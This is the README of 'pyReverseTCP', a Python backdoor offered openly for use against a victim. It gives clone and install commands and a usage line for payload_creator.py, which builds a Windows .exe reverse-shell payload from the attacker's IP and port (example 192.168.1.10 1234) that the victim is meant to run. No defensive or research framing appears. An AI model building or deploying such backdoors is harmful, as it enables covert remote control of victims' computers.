# pyReverseTCP
### A backdoor program made entirely in python
## Installation
1. Cloning this repo
```
$ git clone https://github.com/Astrol99/pyReverseTCP.git
```
2. Install required dependencies

Go into repo directory first
```
$ cd pyReverseTCP/
```
Then use pip with provided requirements.txt with all dependencies listed
```
$ pip install -r requirements.txt
```
## Getting Started
### Making payload
In order to make a connection between you and the victim, the victim must run the payload. But to do that, you must first make a .exe program. A script called payload_creator.py has made this step autonomous, but needs two parameters, the attacker's IP and PORT
> Usage
```
python payload_creator.py <ATTACKER IP> <ATTACKER PORT>
```
> Example
```
python payload_creator.py 192.168.1.10 1234
```
